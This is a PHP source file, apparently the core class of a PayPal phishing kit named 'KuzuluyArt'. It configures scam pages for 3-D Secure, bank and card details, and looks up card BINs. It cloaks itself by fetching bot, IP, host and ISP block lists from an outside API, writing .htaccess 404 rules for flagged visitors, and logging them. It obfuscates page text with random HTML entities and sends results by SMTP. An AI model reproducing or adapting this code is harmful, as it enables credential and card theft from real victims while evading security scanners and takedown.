<?php
session_start();
date_default_timezone_set('Asia/Jakarta');
error_reporting(0);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require __DIR__ . '/include/phpmailer/vendor/autoload.php';

class KuzuluyArt extends PHPMailer {
  public $dir_logs = __DIR__ . '/logs';
  public $dir_config = __DIR__ . '/config';
  public $general_config = 'general.ini';
  public $page_config = 'page.ini';
  public $smtp_config = 'smtp.ini';
  public $visitor_allow = 'x-Allow.html';
  public $visitor_block = 'x-Block.html';
  public function redirect($url) {
    header("location: ".$url);
    exit;
  }
  public function setup() {
    if (!file_exists($this->dir_config.'/'.$this->general_config)) {
      $this->redirect("admin");
    }
  }
  public function create_cookie() {
    setcookie("access_key", $_SESSION['key'], time()+1800);
  }
  public function cookie() {
    if (isset($_COOKIE['access_key'])) {
      if ($_COOKIE['access_key'] != $_SESSION['key']) {
        $this->redirect("success");
      }
    } else {
      $this->redirect("success");
    }
  }
  public function delete_cookie() {
    unset($_COOKIE['access_key']);
  }
  public function ngerandom() {
    return md5(microtime());
  }
  public function save($file, $text, $type) {
    $fp = fopen($file, $type);
    return fwrite($fp, $text);
    fclose($fp);
  }
  public function ngeblock() {
  	$text = "RewriteCond %{REMOTE_ADDR} ^".$_SESSION['ip']."$\nRewriteCond %{REQUEST_URI} !^\/trap\.php$ [NC]\nRewriteRule .* - [L,R=404]\n\n";
    return $this->save(".htaccess", $text, "a");
  }
  public function setGeneral($isi = array()) {
    $action = json_decode($this->priv8("https://kzly.app/api?kuzuluy-apikey-paypal={$isi[0]}"));
    if($action->status == "success") {
      $text .= "\$config_apikey    = '".$isi[0]."';\n";
      $text .= "\$config_model     = '".$isi[1]."';\n";
      $text .= "\$config_scamcase  = '".$isi[2]."';\n";
      $text .= "\$config_filter    = '".$isi[3]."';\n";
      $text .= "\$config_blocker   = '".$isi[4]."';\n";
      $text .= "\$config_smtp      = '".$isi[5]."';\n";
      $text .= "\$config_translate = '".$isi[6]."';\n";
      $text .= "\$config_scamkey   = '".$isi[7]."';\n";
      return $this->save($this->dir_config.'/'.$this->general_config, $text, "w");
    } else {
      return print("<script>alert('Apikey Invalid');</script>");
    }
  }
  public function setSMTP($isi = array()) {
    $text  = "\$config_smtphost   = '".$isi[0]."';\n";
    $text .= "\$config_smtpport   = '".$isi[1]."';\n";
    $text .= "\$config_smtpsecure = '".$isi[2]."';\n";
    $text .= "\$config_smtpuser   = '".$isi[3]."';\n";
    $text .= "\$config_smtppass   = '".$isi[4]."';\n";
    return $this->save($this->dir_config.'/'.$this->smtp_config, $text, "w");
  }
  public function setPage($isi = array()) {
    $text  = "\$config_3dsecure     = '".$isi[0]."';\n";
    $text .= "\$config_bank         = '".$isi[1]."';\n";
    $text .= "\$config_anothercard  = '".$isi[2]."';\n";
    return $this->save($this->dir_config.'/'.$this->page_config, $text, "w");
  }
  public function getIp() {
    foreach (array('CLIENT_IP', 'FORWARDED', 'FORWARDED_FOR', 'FORWARDED_FOR_IP', 'VIA', 'X_FORWARDED', 'X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'HTTP_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED_FOR_IP', 'HTTP_PROXY_CONNECTION', 'HTTP_VIA', 'HTTP_X_FORWARDED', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_CLUSTER_CLIENT_IP', 'REMOTE_ADDR') as $key) {
      if (array_key_exists($key, $_SERVER) === true) {
        foreach (explode(',', $_SERVER[$key]) as $ip) {
          $ip = trim($ip);
          if(filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
            return $ip;
          }
        }
      }
    }
  }
  public function getOs() {
    $os = "Unknown OS";
    $os_array = array(
      '/windows nt 10/i'      =>  'Windows 10',
      '/windows nt 6.3/i'     =>  'Windows 8.1',
      '/windows nt 6.2/i'     =>  'Windows 8',
      '/windows nt 6.1/i'     =>  'Windows 7',
      '/windows nt 6.0/i'     =>  'Windows Vista',
      '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
      '/windows nt 5.1/i'     =>  'Windows XP',
      '/windows xp/i'         =>  'Windows XP',
      '/windows nt 5.0/i'     =>  'Windows 2000',
      '/windows me/i'         =>  'Windows ME',
      '/win98/i'              =>  'Windows 98',
      '/win95/i'              =>  'Windows 95',
      '/win16/i'              =>  'Windows 3.11',
      '/macintosh|mac os x/i' =>  'Mac OS X',
      '/mac_powerpc/i'        =>  'Mac OS 9',
      '/linux/i'              =>  'Linux',
      '/ubuntu/i'             =>  'Ubuntu',
      '/iphone/i'             =>  'iPhone',
      '/ipod/i'               =>  'iPod',
      '/ipad/i'               =>  'iPad',
      '/android/i'            =>  'Android',
      '/blackberry/i'         =>  'BlackBerry',
      '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value) {
      if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
        $os = $value;
      }
    }
    return $os;
  }
  public function getBrowser() {
    $browser = "Unknown Browser";
    $browser_array = array(
      '/msie/i'       =>  'Internet Explorer',
      '/firefox/i'    =>  'Firefox',
      '/safari/i'     =>  'Safari',
      '/chrome/i'     =>  'Chrome',
      '/edge/i'       =>  'Edge',
      '/opera/i'      =>  'Opera',
      '/netscape/i'   =>  'Netscape',
      '/maxthon/i'    =>  'Maxthon',
      '/konqueror/i'  =>  'Konqueror',
      '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) {
      if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
        $browser = $value;
      }
    }
    return $browser;
  }
  public function getAgent() {
    return $_SERVER['HTTP_USER_AGENT'];
  }
  public function getLang() {
    return substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
  }
  public function getRef() {
    if (isset($_SERVER['HTTP_REFERER'])) {
      $ref = $_SERVER['HTTP_REFERER'];
  	} else {
  	  $ref = "No Referer";
  	}
    return $ref;
  }
  public function dataIp($ip) {
    $code = json_decode($this->content("https://extreme-ip-lookup.com/json/{$ip}"));
    $str = array();
    $str['code'] = $code->countryCode;
    $str['country'] = $code->country;
    $str['city'] = $code->city;
    $str['state'] = $code->region;
    $str['isp'] = $code->org;
    return $str;
  }
  public function getHost($ip) {
    return gethostbyaddr($ip);
  }
  public function priv8($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_USERAGENT, "KuzuluyArt v5.6 @achfhr");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    if (curl_errno($ch)) {
      return curl_error($ch);
    } else {
      return $data;
    }
  }
  public function content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G950U1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    if (curl_errno($ch)) {
      return curl_error($ch);
    } else {
      return $data;
    }
  }
  public function blocked($reason) {
    $text = "<tr><td>".$_SESSION['code']."</td><td>".date('d/m/y H:i:s')."</td><td>".$reason."</td><td>".$_SESSION['ip']."</td><td>".$_SESSION['isp']."</td><td>".$_SESSION['host']."</td><td>".$_SESSION['ref']."</td><td>".$_SESSION['agent']."</td></tr>\n";
    return $this->save($this->dir_logs.'/'.$this->visitor_block, $text, "a");
  }
  public function visitor($page) {
    $text = "<tr><td>".$_SESSION['code']."</td><td>".date('d/m/y H:i:s')."</td><td>".$page."</td><td>".$_SESSION['ip']."</td><td>".$_SESSION['isp']."</td><td>".$_SESSION['host']."</td><td>".$_SESSION['ref']."</td><td>".$_SESSION['agent']."</td></tr>\n";
    return $this->save($this->dir_logs.'/'.$this->visitor_allow, $text, "a");
  }
  public function token($key) {
    return json_decode($this->priv8("https://kzly.app/api?kuzuluy-token={$key}"));
  }
  public function emailbot($key){
    return json_decode($this->priv8("https://kzly.app/bot?kuzuluy-apikey={$key}&kuzuluy-type=email"));
  }
  public function blocker() {
    @eval(file_get_contents($this->dir_config.'/'.$this->general_config));
    if ($_SESSION['agent'] == "") {
    	$this->blocked("Unknown Agent");
    	$this->redirect("success");
    }
    $bannedAgent = json_decode($this->priv8("https://kzly.app/bot?kuzuluy-apikey={$config_apikey}&kuzuluy-type=agent"));
    foreach ($bannedAgent as $agent) {
      if (substr_count(strtolower($_SESSION['agent']), $agent) > 0) {
        $this->blocked("Block Agent");
        $this->redirect("success");
      }
    }
    $bannedIP = json_decode($this->priv8("https://kzly.app/bot?kuzuluy-apikey={$config_apikey}&kuzuluy-type=ip"));
    if (in_array(strtolower($_SESSION['ip']), $bannedIP)) {
      $this->blocked("Block IP v1");
      $this->redirect("success");
    } else {
    	foreach ($bannedIP as $ip) {
    		if (preg_match("/$ip/", strtolower($_SESSION['ip']))) {
          $this->blocked("Block IP v2");
        	$this->redirect("success");
    		}
    	}
    }
    $bannedHOST = json_decode($this->priv8("https://kzly.app/bot?kuzuluy-apikey={$config_apikey}&kuzuluy-type=host"));
    foreach ($bannedHOST as $host) {
    	if (substr_count(strtolower($_SESSION['host']), $host) > 0) {
        $this->blocked("Block Hostname");
      	$this->redirect("success");
    	}
    }
    $bannedISP = json_decode($this->priv8("https://kzly.app/bot?kuzuluy-apikey={$config_apikey}&kuzuluy-type=isp"));
    foreach ($bannedISP as $isp) {
      if (substr_count(strtolower($_SESSION['isp']), $isp) > 0) {
        $this->blocked("Block Isp");
        $this->redirect("success");
      }
    }
    $bannedProxy = array(
      'CLIENT_IP',
      'FORWARDED',
      'FORWARDED_FOR',
      'FORWARDED_FOR_IP',
      'VIA',
      'X_FORWARDED',
      'X_FORWARDED_FOR',
      'HTTP_CLIENT_IP',
      'HTTP_FORWARDED',
      'HTTP_FORWARDED_FOR',
      'HTTP_FORWARDED_FOR_IP',
      'HTTP_PROXY_CONNECTION',
      'HTTP_VIA',
      'HTTP_X_FORWARDED',
      'HTTP_X_FORWARDED_FOR'
    );
    foreach ($bannedProxy as $proxy) {
      if (isset($_SERVER[$proxy])) {
        $this->blocked("Block Proxy");
      	$this->redirect("success");
      }
    }
    /* $bannedPort = array(
      80,
      81,
      88,
      443,
      553,
      554,
      808,
      1080,
      3124,
      3127,
      3128,
      3246,
      4480,
      6588,
      8000,
      8008,
      8080,
      8085,
      8088,
      8118,
      9188,
      36673
    );
    foreach ($bannedPort as $port) {
      if (@fsockopen($_SERVER['REMOTE_ADDR'], $port, $errno, $errstr, 1)) {
        $this->blocked("Block Port");
      	$this->redirect("success");
      }
    } */
    $_SESSION['visitor'] = true;
  }
  public function session() {
    if (!isset($_SESSION['visitor'])) {
    	$this->blocked("Block Session");
    	$this->redirect("success");
    }
  }
  public function getStr($string, $start, $end) {
    $str = explode($start, $string);
  	$str = explode($end, $str[1]);
  	return $str[0];
  }
  public function encode($str) {
    $crypt = array(
      "A" => "065",
      "a" => "097",
      "B" => "066",
      "b" => "098",
      "C" => "067",
      "c" => "099",
      "D" => "068",
      "d" => "100",
      "E" => "069",
      "e" => "101",
      "F" => "070",
      "f" => "102",
      "G" => "071",
      "g" => "103",
      "H" => "072",
      "h" => "104",
      "I" => "073",
      "i" => "105",
      "J" => "074",
      "j" => "106",
      "K" => "075",
      "k" => "107",
      "L" => "076",
      "l" => "108",
      "M" => "077",
      "m" => "109",
      "N" => "078",
      "n" => "110",
      "O" => "079",
      "o" => "111",
      "P" => "080",
      "p" => "112",
      "Q" => "081",
      "q" => "113",
      "R" => "082",
      "r" => "114",
      "S" => "083",
      "s" => "115",
      "T" => "084",
      "t" => "116",
      "U" => "085",
      "u" => "117",
      "V" => "086",
      "v" => "118",
      "W" => "087",
      "w" => "119",
      "X" => "088",
      "x" => "120",
      "Y" => "089",
      "y" => "121",
      "Z" => "090",
      "z" => "122",
      "0" => "048",
      "1" => "049",
      "2" => "050",
      "3" => "051",
      "4" => "052",
      "5" => "053",
      "6" => "054",
      "7" => "055",
      "8" => "056",
      "9" => "057",
      "&" => "038",
      " " => "032",
      "_" => "095",
      "-" => "045",
      "@" => "064",
      "." => "046"
    );
    $encode = "";
    for ($i=0; $i < strlen($str); $i++) {
      $key = substr($str, $i, 1);
      if (array_key_exists($key, $crypt)) {
        $random = rand(1, 3);
        if ($random == '1') {
          $encode = $encode.$key;
        } else if ($random == '3') {
          $encode = $encode.$key;
        } else {
          $encode = $encode."&#".$crypt[$key].";";
        }
      } else {
        $encode = $encode.$key;
      }
    }
    return $encode;
  }
  public function bin($bin) {
    $kzly = json_decode($this->content("https://kuzuluy.co/check?bin4={$bin}"));
    return $kzly->brand." ".$kzly->type." ".$kzly->bank." ".$kzly->level;
  }
  public function quote(){
    $kzly = json_decode($this->content("https://kzly.app/quote"));
    return $kzly->quote;
  }
  public function result(){
    @eval(file_get_contents($this->dir_config.'/'.$this->general_config));
    $kzly = json_decode($this->priv8("https://kzly.app/api?kuzuluy-apikey-paypal={$config_apikey}"));
    return $kzly->data->result;
  }
  public function transcode($text) {
    @eval(file_get_contents($this->dir_config.'/'.$this->general_config));
    if ($config_translate == "enable") {
      if ($_SESSION['lang'] == "en") {
        return $this->encode($text);
      } else {
        return $this->encode($text);
        //return  $this->priv8("https://kzly.app/translate?kuzuluy-apikey=".$config_apikey."&from=en&to=".$_SESSION['lang']."&kuzuluy-text=".urlencode($text));
      }
    } else {
      return $this->encode($text);
    }
  }
  public function ngesend($to, $sub, $msg, $xfrom, $xname) {
    @eval(file_get_contents($this->dir_config.'/'.$this->smtp_config));
    if ($config_smtpsecure == "enable") {
      $secure = "tls";
    } else {
      $secure = "none";
    }
    if ($this->checkSmtp() == true) {
      try {
        $this->SMTPDebug = 2;
        $this->isSMTP();
        $this->Host = $config_smtphost;
        $this->Port = $config_smtpport;
        $this->SMTPAuth = true;
        $this->Username = $config_smtpuser;
        $this->Password = $config_smtppass;
        $this->SMTPSecure = $secure;

        $this->setFrom($xname, $xfrom);
        $this->addAddress($to);

        $this->isHTML(true);
        $this->Subject = $sub;
        $this->Body    = $msg;
        $this->CharSet = "UTF-8";
        //$this->AltBody = $msg;
        $this->send();
      }
      catch (Exception $e) {
        die($this->ErrorInfo);
      }
    }
  }
  public function checkSmtp() {
    @eval(file_get_contents($this->dir_config.'/'.$this->smtp_config));
    if ($config_smtpsecure == "enable"){
      $secure = "tls";
    } else {
      $secure = "none";
    }
    $this->isSMTP();
    $this->Host = $config_smtphost;
    $this->Port = $config_smtpport;
    $this->SMTPAuth = true;
    $this->SMTPSecure = $secure;
    $this->Username = $config_smtpuser;
    $this->Password = $config_smtppass;
    $this->Timeout = 15;
    $this->From = "test@kzly.app";
    $this->FromName = "TEST";
    if ($this->smtpConnect()) {
      $this->smtpClose();
      return true;
    } else {
      return false;
    }
  }
}

$api = new KuzuluyArt();
?>
